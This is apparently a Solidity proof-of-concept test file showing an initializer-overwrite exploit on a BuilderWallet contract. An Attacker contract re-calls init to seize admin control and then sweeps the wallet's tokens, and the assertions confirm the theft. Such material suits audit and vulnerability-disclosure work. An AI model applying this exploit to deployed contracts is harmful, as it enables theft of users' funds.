// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {BuilderFactory, BuilderWallet} from "../src/BuilderWallet.sol";

contract MockERC20 {
    string public name = "Mock Token";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Attacker {
    function attack(BuilderWallet wallet, address token) external {
        wallet.init(address(this));
        wallet.sweep(token, address(this));
    }
}

contract BuilderWalletPoC {
    function test_exploit_init_overwrite() public {
        BuilderFactory factory = new BuilderFactory(address(this));
        address legitAdmin = address(0xBEEF);
        uint48 builderCode = 123;

        address walletAddr = factory.deployBuilder(builderCode, legitAdmin);
        BuilderWallet wallet = BuilderWallet(walletAddr);
        assert(wallet.builderAdmin() == legitAdmin);

        MockERC20 token = new MockERC20();
        token.mint(walletAddr, 100 ether);
        assert(token.balanceOf(walletAddr) == 100 ether);

        Attacker attacker = new Attacker();
        attacker.attack(wallet, address(token));

        assert(wallet.builderAdmin() == address(attacker));
        assert(token.balanceOf(walletAddr) == 0);
        assert(token.balanceOf(address(attacker)) == 100 ether);
    }

    function test_safety_factory_init() public {
        BuilderFactory factory = new BuilderFactory(address(this));
        address legitAdmin = address(0xBEEF);

        address walletAddr = factory.deployBuilder(123, legitAdmin);
        BuilderWallet wallet = BuilderWallet(walletAddr);

        assert(wallet.builderAdmin() == legitAdmin);
    }
}
